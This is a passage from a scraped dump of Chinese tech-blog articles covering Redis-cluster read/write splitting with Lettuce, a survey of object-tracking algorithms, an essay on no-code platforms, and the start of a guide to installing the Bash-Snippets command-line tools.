,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,RedisClusterClient ,clusterClient,  ,=, ,RedisClusterClient,.,create,(,listRedisURIs,),;,StatefulRedisClusterConnection,<,String,,, ,String,>, ,connection, ,=, ,clusterClient,.,connect,(,),;,connection,.,setReadFrom,(,ReadFrom,.,SLAVE,),;,  ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在业务类service中注入Lettuce相关的redisClusterConnection，进行相关读写操作。以下是我直接化简到了springbootstarter中进行，参考代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n@SpringBootApplication\r\npublic class NewRedisClientApplication {\r\n\r\n    public static void main(String[] args) {\r\n        ApplicationContext context = SpringApplication.run(NewRedisClientApplication.class, args);\r\n\r\n        StatefulRedisClusterConnection<String, String> redisClusterConnection = (StatefulRedisClusterConnection)context.getBean(\"redisClusterConnection\");\r\n        System.out.println(redisClusterConnection.sync().get(\"event:10\"));\r\n\r\n\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,@,SpringBootApplication,public, ,class, ,NewRedisClientApplication, ,{, ,    ,public, ,static, ,void, ,main,(,String,[,], ,args,), ,{,        ,ApplicationContext ,context, ,=, ,SpringApplication,.,run,(,NewRedisClientApplication,.,class,,, ,args,),;, ,        ,StatefulRedisClusterConnection,<,String,,, ,String,>, ,redisClusterConnection, ,=, ,(,StatefulRedisClusterConnection,),context,.,getBean,(,\"redisClusterConnection\",),;,        ,System,.,out,.,println,(,redisClusterConnection,.,sync,(,),.,get,(,\"event:10\",),),;, , ,    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,运行的结果如下图所示：,\n,\n,可以看到，经过改写的redisClusterConnection的确能读取到redis-cluster的数据。但这一个数据我们还需要验证一下到底是不是通过slave读取到的，又或者还是通过slave重定向给master才获取到的？,\n带着疑问，我们可以开通debug模式，在redisClusterConnection.sync().get(“event:10”)等类似的获取数据的代码行上面打上断点。通过代码的走查，我们可以看到，在ReadFromImpl类中，最终会select到key所在的slave节点，进行返回，并在该slave中进行数据的读取：,\n,ReadFromImpl显示：,\n,\n,另外我们通过connectFuture中的显示也验证了对于slave的readonly生效了：,\n,\n,这样，就达到了通过Lettuce客户端对redis-cluster的读写分离了。,\n,使用该方案进行redis-cluster性能的提升的优点有：,\n（1）直接通过代码级更改，而不需要配置新的redis-cluster环境。,\n（2）无需增加机器或升级硬件设备。,\n,但同时，该方案也有缺点：,\n（1）非官方对redis-cluster的推荐方案，因为在redis-cluster架构下，进行读写分离，有可能会读到过期的数据。,\n（2）需对项目进行全面的替换，将Jedis客户端变为Lettuce客户端，对代码的改动较大，而且使用Lettuce时，使用的并非spring boot的自带集成Lettuce的redisTemplate配置方法，而是自己配置读写分离的 redisClusterConnetcion，日后遇到问题的时候，可能官方文档的支持率或支撑能力会比较低。,\n（3）需修改redis-cluster的master、slave配置，在各个节点中都需要加入slave-read-only yes。,\n（4）性能的提升没有水平扩展master主机和实例来得直接干脆。,\n, ,\n,总结,\n,总体上来说，redis-cluster高可用架构方案是目前最好的redis架构方案，redis的官方对redis-cluster架构是建议redis-master用于接收读写，而redis-slave则用于备份（备用），默认不建议读写分离。但如果不介意读取的是redis-cluster中有可能过期的数据并且对写请求不感兴趣时，则亦可通过readonly命令，将slave设置成可读，然后通过slave获取相关的key，达到读写分离。Jedis、Lettuce都可以进行redis-cluster的读写操作，而且默认只针对Master进行读写，若要对redis-cluster架构下进行读写分离，则Jedis需要进行源码的较大改动，而Lettuce开放了setReadFrom()方法，可以进行二次封装成读写分离的客户端，相对简单，而且Lettuce比Jedis更安全。redis-cluster架构下可以直接通过水平扩展master来达到性能的提升。,\n, ,\n,参考文档,\n,1，网文《关于redis主从、哨兵、集群的介绍》：https://blog.csdn.net/c295477887/article/details/52487621,\n2，知乎《lettuce与jedis对比介绍》：https://www.zhihu.com/question/53124685,\n3，网文《Redis 高可用架构最佳实践问答集锦》：http://www.talkwithtrend.com/Article/178165,\n4，网文《Redis进阶实践之十一 Redis的Cluster集群搭建》：https://www.cnblogs.com/PatrickLiu/p/8458788.html,\n5，redis官方在线文档：https://redis.io/,\n6，网文《redis cluster的介绍及搭建(6)》：https://blog.csdn.net/qq1137623160/article/details/79184686,\n7，网文《Springboot2.X集成redis集群(Lettuce)连接》：http://www.cnblogs.com/xymBlog/p/9303032.html,\n8，Jedis的gitHub地址：https://github.com/xetorthio/jedis,\n9，Lettuce的gitHub地址：https://github.com/lettuce-io/lettuce-core/,\n,\n, ,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 3 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114270/", "url_object_id": "ff71528650cafbc9d1a04fda19074c0c", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/a1a4de99de0c75eab712542a7dac876f.png"], "title": "目标跟踪算法分类", "create_time": "2018/08/19", "vote": "1", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,张酱油。,   ,运动目标跟踪主流算法大致分类,\n,主要基于两种思路：,\n,\n,a)不依赖于先验知识，直接从图像序列中检测到运动目标，并进行目标识别，最终跟踪感兴趣的运动目标；,\n,b)依赖于目标的先验知识，首先为运动目标建模，然后在图像序列中实时找到相匹配的运动目标。,\n,\n,一．运动目标检测,\n,对于不依赖先验知识的目标跟踪来讲，运动检测是实现跟踪的第一步。运动检测即为从序列图像中将变化区域从背景图像中提取出来。运动目标检测的算法依照目标与摄像机之间的关系可以分为静态背景下运动检测和动态背景下运动检测。,\n,（一）静态背景,\n,1.背景差,\n,2.帧差,\n,3.GMM,\n,4.光流,\n,背景减算法可以对背景的光照变化、噪声干扰以及周期性运动等进行建模，在各种不同情况下它都可以准确地检测出运动目标。因此对于固定摄像头的情形，目前大多数的跟踪算法中都采用背景减算法来进行目标检测。背景减算法的局限性在于它需要一个静态的固定摄像头。,\n,（二）运动场,\n,通常情况下，摄像机的运动形式可以分为两种：a)摄像机的支架固定，但摄像机可以偏转、俯仰以及缩放; b)将摄像机装在某个移动的载体上。由于以上两种情况下的背景及前景图像都在做全局运动，要准确检测运动目标的首要任务是进行图像的全局运动估计与补偿。,\n,考虑到图像帧上各点的全局运动矢量虽不尽相同 (摄像机做平移运动除外 )，但它们均是在同一摄像机模型下的运动，因而应遵循相同的运动模型，可以用同一模型参数来表示。,\n,全局运动的估计问题就被归结为全局运动模型参数的估计问题，通常使用块匹配法或光流估计法来进行运动参数的估计。,\n,块匹配,\n,基于块的运动估算和补偿可算是最通用的算法。可以将图像分割成不同的图像块，假定同一图像小块上的运动矢量是相同的，通过像素域搜索得到最佳的运动矢量估算。块匹配法主要有如下三个关键技术：,\n,\n,a)匹配法则，如最大相关、最小误差等,\n,b)搜索方法，如三步搜索法、交叉搜索法等。,\n,c) 块大小的确定，如分级、自适应等。,\n,\n,光流法,\n,光流估计的方法都是基于以下假设：图像灰度分布的变化完全是目标或者场景的运动引起的，也就是说，目标与场景的灰度不随时间变化。这使得光流方法抗噪声能力较差，其应用范围一般局限于目标与场景的灰度保持不变这个假设条件下。另外，大多数的光流计算方法相当复杂，如果没有特别的硬件装置，其处理速度相当慢，达不到实时处理的要求。,\n,二．目标跟踪,\n,运动目标的跟踪，即通过目标的有效表达，在图像序列中寻找与目标模板最相似候选目标区位置的过程。简单说，就是在序列图像中为目标定位。运动目标的有效表达除了对运动目标建模外，目标跟踪中常用到的目标特性表达主要包括视觉特征 (图像边缘、轮廓、形状、纹理、区域)、统计特征 (直方图、各种矩特征)、变换系数特征 (傅里叶描绘子、自回归模型)、代数特征 (图像矩阵的奇异值分解)等。除了使用单一特征外，也可通过融合多个特征来提高跟踪的可靠性.,\n,相似性度量算法 ,\n,对运动目标进行特性提取之后，需要采用一定的相似性度量算法与帧图像进行匹配，从而实现目标跟踪。图像处理与分析理论中，常见的相似性度量方法有欧氏距离、街区距离、棋盘距离、加权距离、巴特查理亚系数、Hausdorff距离等，其中应用最多和最简单的是欧氏距离。,\n,搜索算法 ,\n,目标跟踪过程中，直接对场景中的所有内容进行匹配计算，寻找最佳匹配位置，需要处理大量的冗余信息，这样运算量比较大，而且没有必要。采用一定的搜索算法对未来时刻目标的位置状态进行估计假设，缩小目标搜索范围便具有了非常重要的意义。其中一类比较常用的方法是预测运动体下一帧可能出现的位置，在其相关区域内寻找最优点。常见的预测算法有Kalman滤波、扩展的Kalman滤波及粒子滤波方法等。,\n,Kalman滤波器是一个对动态系统的状态序列进行线性最小方差估计的算法。它通过状态方程和观测方程来描述一个动态系统，基于系统以前的状态序列对下一个状态作最优估计，预测时具有无偏、稳定和最优的特点，且具有计算量小、可实时计算的特点，可以准确地预测目标的位置和速度，但其只适合于线性且呈高斯分布的系统。相对于卡尔曼滤波算法，粒子滤波器特别适用于非线性、非高斯系统。粒子滤波算法是一种基于蒙特卡洛和贝叶斯估计理论的最优算法，它以递归的方式对测量数据进行序贯处理，因而无须对以前的测量数据进行存储和再处理，节省了大量的存储空间。在跟踪多形式的目标以及在非线性运动和测量模型中，粒子滤波器具有极好的鲁棒性。,\n,另一类减小搜索范围的算法是优化搜索方向。均值漂移算法 (Meanshift算法 )、连续自适应均值漂移算法 (Camshift算法 )和置信区域算法都是利用无参估计的方法优化目标模板和候选目标距离的迭代收敛过程，以达到缩小搜索范围的目的。Meanshift算法是利用梯度优化方法实现快速目标定位，能够对非刚性目标实时跟踪，适合于非线性运动目标的跟踪，对目标的变形、旋转等运动有较好的适用性。但是 Meanshift算法在目标跟踪过程中没有利用目标在空间中的运动方向和运动速度信息，当周围环境存在干扰时 (如光线、遮挡 )，容易丢失目标。Camshift算法是在Meanshift算法的基础上，进行了一定的扩展，结合目标色彩信息形成的一种改进的均值漂移算法。由于目标图像的直方图记录的是颜色出现的概率，这种方法不受目标形状变化的影响，可以有效地解决目标变形和部分遮挡的问题，且运算效率较高，但该算法在开始前需要由人工指定跟踪目标。,\n,目标跟踪分类 ,\n,依据运动目标的表达和相似性度量，运动目标跟踪算法可以分为四类：基于主动轮廓的跟踪、基于特征的跟踪、基于区域的跟踪和基于模型的跟踪。跟踪算法的精度和鲁棒性很大程度上取决于对运动目标的表达和相似性度量的定义，跟踪算法的实时性取决于匹配搜索策略和滤波预测算法。,\n,1、基于主动轮廓的跟踪,\n,Kass等人提出的主动轮廓模型，即Snake模型，是在图像域内定义的可变形曲线，通过对其能量函数的最小化，动态轮廓逐步调整自身形状与目标轮廓相一致，该可变形曲线又称为Snake曲线。Snake技术可以处理任意形状物体的任意形变，首先将分割得到的物体边界作为跟踪的初始模板然后确定表征物体真实边界的目标函数，并通过降低目标函数值，使初始轮廓逐渐向物体的真实边界移动。,\n基于主动轮廓跟踪的优点是不但考虑来自图像的灰度信息，而且考虑整体轮廓的几何信息，增强了跟踪的可靠性。由于跟踪过程实际上是解的寻优过程，带来的计算量比较大，而且由于 Snake模型的盲目性，对于快速运动的物体或者形变较大的情况，跟踪效果不够理想。,\n,2、基于特征的跟踪,\n,基于特征匹配的跟踪方法不考虑运动目标的整体特征，只通过目标图像的一些显著特征来进行跟踪。假定运动目标可以由惟一的特征集合表达，搜索到该相应的特征集合就认为跟踪上了运动目标。除了用单一的特征来实现跟踪外，还可以采用多个特征信息融合在一起作为跟踪特征。基于特征的跟踪主要包括特征提取和特征匹配两个方面。,\n,(1)特征提取,\n,特征提取是指从景物的原始图像中提取图像的描绘特征，理想的图像特征应具备的特点是：,\n,\n,a)特征应具有直观意义，符合人们的视觉特性;,\n,b)特征应具备较好的分类能力，能够区分不同的图像内容;,\n,c)特征计算应该相对简单，以便于快速识别;,\n,d)特征应具备图像平移、旋转、尺度变化等不变性。,\n,\n,目标跟踪中常用的运动目标的特征主要包括颜色、纹理、边缘、块特征、光流特征、周长、面积、质心、角点等。提取对尺度伸缩、形变和亮度变化不敏感的有效特征至今仍是图像处理研究领域中一个比较活跃的方面。,\n,(2)特征匹配,\n,特征提取的目的是进行帧间目标特征的匹配，并以最优匹配来跟踪目标。常见的基于特征匹配的跟踪算法有基于二值化目标图像匹配的跟踪、基于边缘特征匹配或角点特征匹配的跟踪、基于目标灰度特征匹配的跟踪、基于目标颜色特征匹配的跟踪等。,\n,基于特征的跟踪算法的优点在于对运动目标的尺度、形变和亮度等变化不敏感，即使目标的某一部分被遮挡，只要还有一部分特征可以被看到，就可以完成跟踪任务；另外，这种方法与 Kalman滤波器联合使用，也具有很好的跟踪效果。但是其对于图像模糊、噪声等比较敏感，图像特征的提取效果也依赖于各种提取算子及其参数的设置，此外，连续帧间的特征对应关系也较难确定，尤其是当每一帧图像的特征数目不一致、存在漏检、特征增加或减少等情况。,\n,3、基于区域的跟踪,\n,基于区域的跟踪算法基本思想是：,\n,\n,a)得到包含目标的模板，该模板可通过图像分割获得或预先人为确定，模板通常为略大于目标的矩形，也可为不规则形状;,\n,b)在序列图像中，运用相关算法跟踪目标。,\n,\n,这种算法的优点在于当目标未被遮挡时，跟踪精度非常高、跟踪非常稳定。但其缺点首先是费时，当搜索区域较大时情况尤其严重;其次，算法要求目标变形不大，且不能有太大遮挡，否则相关精度下降会造成目标的丢失。近年来，对基于区域的跟踪方法关注较多的是如何处理模板变化时的情况，这种变化是由运动目标姿态变化引起的，如果能正确预测目标的姿态变化，则可实现稳定跟踪。,\n,4、基于模型的跟踪,\n,基于模型的跟踪是通过一定的先验知识对所跟踪目标建立模型，然后通过匹配跟踪目标进行模型的实时更新。对于刚体目标来说，其运动状态变换主要是平移、旋转等，可以利用该方法实现目标跟踪。但是实际应用中跟踪的不仅仅是刚体，还有一大部分是非刚体，目标确切的几何模型不容易得到。,\n,这种方法不易受观测视角的影响，具有较强的鲁棒性，模型匹配跟踪精度高，适合于机动目标的各种运动变化，抗干扰能力强，但由于计算分析复杂、运算速度慢，模型的更新较为复杂，实时性较差。准确建立运动模型是模型匹配能否成功的关键,\n,1.区域与区域匹配,\n,这种算法的优点在于当目标未被遮挡时，跟踪精度非常高，跟踪非常稳定。但其缺点首先是费时，当搜索区域较大时情况尤其严重；其次，算法要求目标变形不大，且不能有太大遮挡，否则相关精度下降会造成目标的丢失。,\n,2.特征点（关键点）跟踪,\n,KLT：Shi和Tomasi 在1994年提出的KLT 跟踪算法是一种被广泛应用的基于特征点跟踪算法。由于特征点分布在整个目标上，因此即使有一部分被遮挡，仍然可以跟踪到另外一部分特征点，这也是基于特征点跟踪算法的优点。,\n,基于特征点的跟踪算法中，比较困难的问题是当目标发生旋转或者被遮挡时，如何准确地完成特征点的提取、保存、删除等工作,\n,3.基于主动轮廓的跟踪算法,\n,主动轮廓模型也称为Snake 模型，这种方法能较精确地跟踪上目标的轮廓。Snake 模型非常适合可变形目标的跟踪，如对运动细胞的跟踪。这种模型与卡尔曼滤波相结合能够更好地进行跟踪。Snake模型比较适合单目标的跟踪，对于多目标跟踪更多地是采用基于水平集(Level Set)方法的主动轮廓模型,\n,4.光流,\n,Lucas-Kanade稀疏光流calcOpticalFlowPyrLK（利用金字塔）,\n,Horn-Schunck稠密光流calcOpticalFlowHS,\n,稠密光流需要很大的计算量，OpenCV中对此方法做了简化，即对前后连续帧的一个像素的邻域进行匹配，这种方法叫块匹配。,\n,稀疏光流需要在跟踪之前指定一组点，如果这些点具有某些明显特征，那么跟踪就会相对稳定和可靠。可见，其运算量比稠密光流要小很多。,\n,首先利用goodFeaturesToTrack函数得到图像中的强边界作为跟踪的特征点，接下来要调用calcOpticalFlowPyrLK函数，输入两幅连续的图像，并在第一幅图像里选择一组特征点，输出为这组点在下一幅图像中的位置。再把得到的跟踪结果过滤一下，去掉不好的特征点。再把特征点的跟踪路径标示出来。,\n,（实际效果一般）,\n,5.mean-shift和 camshift,\n,Mean-shift优缺点,\n,meanShift算法用于视频目标跟踪时，采用目标的颜色直方图作为搜索特征，通过不断迭代meanShift向量使得算法收敛于目标的真实位置，从而达到跟踪的目的。,\n,传统的meanShift算法在跟踪中有几个优势：,\n,\n,（1）算法计算量不大，在目标区域已知的情况下完全可以做到实时跟踪；,\n,（2）采用核函数直方图模型，对边缘遮挡、目标旋转、变形和背景运动不敏感。,\n,\n,同时，meanShift算法也存在着以下一些缺点：,\n,\n,（1）缺乏必要的模板更新；,\n,（2）跟踪过程中由于窗口宽度大小保持不变，当目标尺度有所变化时，跟踪就会失败；,\n,（3）当目标速度较快时，跟踪效果不好；,\n,（4）直方图特征在目标颜色特征描述方面略显匮乏，缺少空间信息；,\n,\n,由于其计算速度快，对目标变形和遮挡有一定的鲁棒性，所以，在目标跟踪领域，meanShift算法目前依然受到大家的重视。但考虑到其缺点，在工程实际中也可以对其作出一些改进和调整；例如：,\n,\n,（1）引入一定的目标位置变化的预测机制，从而更进一步减少meanShift跟踪的搜索时间，降低计算量；,\n,（2）可以采用一定的方式来增加用于目标匹配的“特征”；,\n,（3）将传统meanShift算法中的核函数固定带宽改为动态变化的带宽；,\n,（4）采用一定的方式对整体模板进行学习和更新；,\n,\n,CamShift算法,\n,CamShift算法的全称是”ContinuouslyAdaptive Mean-SHIFT”，即：连续自适应的MeanShift算法。其基本思想是对视频序列的所有图像帧都作MeanShift运算，并将上一帧的结果（即搜索窗口的中心位置和窗口大小）作为下一帧MeanShift算法的搜索窗口的初始值，如此迭代下去。简单点说，meanShift是针对单张图片寻找最优迭代结果，而camShift则是针对视频序列来处理，并对该序列中的每一帧图片都调用meanShift来寻找最优迭代结果。正是由于camShift针对一个视频序列进行处理，从而保证其可以不断调整窗口的大小，如此一来，当目标的大小发生变化的时候，该算法就可以自适应地调整目标区域继续跟踪。,\n,在OpenCV自带的camShift的例子当中，是通过计算目标在HSV空间下的H分量直方图，通过直方图反向投影得到目标像素的概率分布，然后通过调用OpenCV的CAMSHIFT算法，自动跟踪并调整目标窗口的中心位置与大小。该算法对于简单背景下的单目标跟踪效果较好，但如果被跟踪目标与背景颜色或周围其它目标颜色比较接近，则跟踪效果较差。另外，由于采用颜色特征，所以它对被跟踪目标的形状变化有一定的抵抗能力。,\n,OpenCV自带例子中的camShift算法，可以分为三个部分：,\n,A、计算色彩投影图（反向投影）：,\n,\n,（1）为了减少光照变化对目标跟踪的影响，首先将图像从RGB颜色空间转换到HSV颜色空间；,\n,（2）对H分量进行直方图统计，直方图代表了不同H分量取值出现的概率，或者说可以据此查找出H分量的大小为x时的概率或像素个数，即，得到颜色概率查找表；,\n,（3）将图像中每个像素的值用其颜色出现的概率进行替换，由此得到颜色概率分布图；,\n,\n,以上三个步骤称之为反向投影，需要提醒的是，颜色概率分布图是一个灰度图像；,\n,B、meanShift寻优,\n,前面提到过meanShift算法（,http://blog.csdn.net/carson2005/article/details/7337432,）是一种非参数概率密度估计方法，它通过不断迭代计算得到最优搜索窗口的位置和大小。,\n,C、camShift跟踪算法,\n,前面提到，camShift其实就是在视频序列的每一帧当中都运用meanShift，并将上一帧的meanShift结果作为下一帧的初始值，如此不断循环迭代，就可以实现目标的跟踪了。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114283/", "url_object_id": "3b1394a57d494002f8b20bd9818d5dec", "front_image_path": "full/30fcdf79d0b901a9dde107f5e6e10f11fd95d574.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/08/programmer-developer-at-work.jpg"], "title": "软件的未来是无码", "create_time": "2018/08/20", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Greg Satell,   译文出处：,开源中国,   ,早期的数字计算机不是很有用。当然，它们远比它们所取代的穿孔卡片制表机强大得多，但它们很难编程。指令需要用汇编代码编写，这很浪费时间，也很难。,\n,John Backus在20世纪50年代早期开始开发FORTRAN，计算机系统开始发生变化，它用命令语句代替了汇编语言，将与英语大致相似的东西编译成底层代码。后来的语言建立在基本逻辑之上，将低级代码的命令编译成更简单的代码。,\n,现今，公司大多喜欢Quick Base、Mendix, 和 Zudy。这种创新性产品（工具），他们的运作的方式都是类似的，试图将代码转换为可视化界面。就像从汇编代码转换到FORTRAN一样，底层代码还是存在的，但它可以更简单地来表示。这些低代码/无代码平台开始瓦解企业中软件运行的方式。,\n,可视化界面是无代码平台强大功能的关键。,\n,云中断和应用程序编程接口经济,\n,传统上，技术受惠于大型企业。开发系统需要对硬件进行大量的投资，以及设计应用程序的昂贵顾问。一旦它们被建造出来，它们也很难改造和升级，所以系统将会持续数年——有时甚至几十年——而不会做较大的升级。,\n,“我们的态度是，‘我们建造它，你应该喜欢它’，”Quick Base的战略和产品管理高级副总裁杰伊贾米森这么告诉我。因此，遗留系统占了上风，人们只是学会了在他们周围工作，在检查清单和Excel电子表格上做一些事情。它不是很有效率，但基本上是有效的。,\n,云使任何有互联网连接的人都可以使用强大的系统，从而破坏了许多遗留系统。即使是最小的初创公司，也可以使用大企业可用的技术，而不必预先支付费用。也许同样重要的是，这些系统可以通过应用程序编程接口(API)连接到其他系统。,\n,云计算和api为小型敏捷公司提供了很多优势。如果没有遗留系统的阻碍，它们可以比规模更大的竞争对手更快地部署云技术，并为客户提供更好的服务。但是没有代码的平台正在帮助大型企业以创业公司的速度和敏捷性前进。,\n,克服遗留系统,\n,作为设施管理行业的高管，Bruce Squibb深知遗留系统的局限性。在设施管理中，每个项目本质上都是独一无二的，系统需要适应不同类型的架构、客户需求、维护计划等等。,\n,例如，Squibb的公司 Able Services 最近签了一份合同，为一家大型大学管理几个校区的清洁服务。要想有效地开始这份事业，你需要管理很多零碎的事情，同时还要让经理、一线员工和客户保持一致。这是一份辛苦的工作。,\n,早些年，大部分工作都是通过电子表格来完成的，这些电子表格会被发送回中央办公室，在主报告中进行更新。然而，Squibb的团队使用Quick Base设计了一个应用程序，它使之前很多需要做的事情都自动化了，这有助于他的团队更快地运行，更透明，错误更少。,\n,也许更重要的是，因为Quick Base是一个没有代码的平台，应用程序可以很容易地根据需要进行定制和扩展。例如，如果客户制定了新的设施法规或购买了新的设备，应用程序可以在考虑到这些更改需求后短短几个小时内进行更改。,\n,推翻传统商业模型,\n,实际上，非编码平台推翻了传统的IT模型。一线管理者越来越变成开发活动的关键部分，而不是过去由程序员主导的应用应该看起来是什么样子。过去管理者只能通过Excel表或者检查表来工作，现在这些都可以搬到云端了。,\n,“非编码或少编码平台的最大好处是它让你所见即所得地处理开发元素而不需要写代码。这可以加速开发进程并同时提升软件质量。”Marshal Worster告诉我，他是Mendix的解决方案架构师，高级总监。,\n,可视化接口是非编码平台最关键的部分。 因为它是如此易用，前端管理者和其它非技术人员也可以做一些前端的工作。例如构建屏幕布局，设计和添加功能等。他们再也不必跟开发人员一遍遍解释他们想要什么，应该是什么样子了。,\n,今天，计算机已经无处不在了。,\n,基本上，非编码或少编码平台让十几年前的敏捷开发运动成为了现实，迈出了长足的一步。越来越多的企业开始主动地参与到软件开发中来。,\n,建造敏捷企业,\n,相对于早期的计算技术，我们已经前进了一大步。在当年计算机还是一个隐藏在屋子里的庞然大物时，它只能由那些通晓晦涩计算机语言的精英人群来操作，可是今天，计算机已经无处不在了。,\n,无编码平台可以满足分布式控制下的分布式功能。“无编码非常灵活，可以满足任何人” Quick Base的Jay Jamison对我说。“敏捷开发活动使得开发者更接近商业决策，无编码平台赋能一线管理者贡献自身价值到开发进程中，并且越来越多地独立完成一些任务。”,\n,他也指出当一线管理者可以影响到开发进程时，策略和实现可以更好地同步。“你们正在讨论的业务可以在几天或几周内对他们的策略产生影响，而不是几个月或几年”Jamison说。,\n,今天，计算机已变为基本的商业工具，它越来越显得不那么“高科技”了，可是随着我们赋予这些工具的功能越来越多，我们的生活将会变得更美好。未来的技术总是更人性化。,\n,作者 Greg Satell,\n,创新导图作者、演说家、创新顾问 @HBR 和 @ Inc 撰稿人和出版人,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114285/", "url_object_id": "269870551619a0a59487baffde0fa1fe", "front_image_path": "full/bb38d11fb4038702790e0370ed966c50f186ff40.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/1e19e82a0dc17db6a2d4b661b2864324.png"], "title": "献给命令行重度用户的一组实用 BASH 脚本", "create_time": "2018/08/22", "vote": "2", "bookmark": "1", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,SK,   译文出处：,Linux中国/MjSeven,   ,今天，我偶然发现了一组适用于命令行重度用户的实用 BASH 脚本，这些脚本被称为 ,Bash-Snippets,，它们对于那些整天都与终端打交道的人来说可能会很有帮助。想要查看你居住地的天气情况？它为你做了。想知道股票价格？你可以运行显示股票当前详细信息的脚本。觉得无聊？你可以看一些 YouTube 视频。这些全部在命令行中完成，你无需安装任何严重消耗内存的 GUI 应用程序。,\n,在撰写本文时，Bash-Snippets 提供以下 19 个实用工具：,\n,\n,Cheat, – Linux 命令备忘单。,\n,Cloudup, – 一个将 GitHub 仓库备份到 bitbucket 的工具。,\n,Crypt, – 加解密文件。,\n,Cryptocurrency, – 前 10 大加密货币的实时汇率转换。,\n,Currency, – 货币转换器。,\n,Geo, – 提供 wan、lan、router、dns、mac 和 ip 的详细信息。,\n,Lyrics, – 从命令行快速获取给定歌曲的歌词。,\n,Meme, – 创造命令行表情包。,\n,Movies, – 搜索并显示电影详情。,\n,Newton, – 执行数值计算一直到符号数学解析。（to 校正：这里不理解）,\n,Qrify, – 将给定的字符串转换为二维码。,\n,Short, – 缩短 URL,\n,Siteciphers, – 检查给定 https 站点启用或禁用的密码。,\n,Stocks, – 提供某些股票的详细信息。,\n,Taste, – 推荐引擎提供三个类似的项目，如提供物品（如书籍、音乐、艺术家、电影和游戏等。）,\n,Todo, – 命令行待办事项管理。,\n,Transfer, – 从命令行快速传输文件。,\n,Weather, – 显示你所在地的天气详情。,\n,Youtube-Viewer, – 从终端观看 YouTube 视频。,\n,\n,作者可能会在将来添加更多实用程序和/或功能，因此我建议你密切关注该项目的网站或 GitHub 页面以供将来更新。,\n,安装,\n,你可以在任何支持 BASH 的操作系统上安装这些脚本。,\n,首先，克隆 git 仓库，使用以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git clone https://github.com/alexanderepstein/Bash-Snippets,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,clone, ,https,:,//github.com/alexanderepstein/Bash-Snippets,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,进入目录：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cd Bash-Snippets/,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cd ,Bash,-,Snippets,/,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,切换到最新的稳定版本：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git checkout v1.22.0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,checkout ,v1,.,22.0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,最后，使用以下命令安装 Bash-Snippets：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sudo ./install.sh,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sudo, ,.,/,install,.,sh,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这将询问你要安装哪些脚本。只需输入 ,Y, 并按回车键即可安装相应的脚本。如果你不想安装某些特定脚本，输入 ,N, 